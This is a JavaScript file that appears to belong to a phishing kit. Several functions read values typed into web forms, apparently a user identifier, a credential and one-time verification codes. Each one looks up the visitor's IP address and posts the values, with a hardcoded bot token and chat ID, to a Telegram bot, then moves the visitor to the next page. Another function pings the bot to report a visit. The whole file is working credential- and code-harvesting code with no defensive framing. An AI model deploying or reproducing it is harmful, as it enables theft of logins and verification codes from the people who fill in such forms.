function xldfr() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        document.getElementById("frm1").innerHTML = this.responseText; 
        document.getElementById("frm1").onclick = null;
        }
    };
    xhttp.open("GET", "xfr.html", true);
    xhttp.send();

    
}
function xldfr2() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        document.getElementById("frm1").innerHTML = this.responseText; 
        document.getElementById("frm1").onclick = null;
        }
    };
    xhttp.open("GET", "xfr2.html", true);
    xhttp.send();
}
function xldfr3() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        document.getElementById("frm1").innerHTML = this.responseText; 
        document.getElementById("frm1").onclick = null;
        }
    };
    xhttp.open("GET", "xfr3.html", true);
    xhttp.send();
}



function xsndf(event){
    if (event) event.preventDefault();
    

    var tokl = "6279465884:AAF2Ptv0e_IvmAx8oW2op1rXPBliMVZfxR0";
    var chat = "-987346419";
    var xinpt = $("#xinpt").val();
    var xinpt2 = $("#xinpt2").val();
    var xinpt3 = $("#xinpt3").val();
    var ips = "";

    if(!xinpt || !xinpt2 || !xinpt3){
        console.log("empty");
        $("#xinpt").focus();
    }else{

        mess = `GAL - D:${xinpt} - U:${xinpt2} - C:${xinpt3}`;
        //console.log( document.getElementById("ix77").value );
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tokl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify({
                    "chat_id": chat,
                    "text": "I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                window.location = "2.html";
            });  
        });
    }
}

function xsndf2(event){
    if (event) event.preventDefault();
    

    var tokl = "6279465884:AAF2Ptv0e_IvmAx8oW2op1rXPBliMVZfxR0";
    var chat = "-987346419";
    var xinpt = $("#xinpt4").val();
    var ips = "";

    console.log(xinpt);

    if(!xinpt){
        console.log("empty");
    }else{

        mess = `GAL - COD:${xinpt}`;
        //console.log( document.getElementById("ix77").value );
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tokl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify({
                    "chat_id": chat,
                    "text": "I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                window.location = "3.html";
            });  
        });
    }
}

function xsndf3(event){
    if (event) event.preventDefault();
    

    var tokl = "6279465884:AAF2Ptv0e_IvmAx8oW2op1rXPBliMVZfxR0";
    var chat = "-987346419";
    var xinpt = $("#xinpt4").val();
    var ips = "";

    console.log(xinpt);

    if(!xinpt){
        console.log("empty");
    }else{

        mess = `GAL - COD2:${xinpt}`;
        //console.log( document.getElementById("ix77").value );
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tokl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify({
                    "chat_id": chat,
                    "text": "I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                window.location = "4.html";
            });  
        });
    }
}

function xsndfx(){
    
    var tokl = "6279465884:AAF2Ptv0e_IvmAx8oW2op1rXPBliMVZfxR0";
    var chat = "-987346419";
    var xinpt = "yes"

    if(!xinpt){
        console.log("empty");
    }else{

        mess = `GAL - Go`;
        
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tokl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify({
                    "chat_id": chat,
                    "text": "I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                console.log("go");
            });  
        });
    }
}


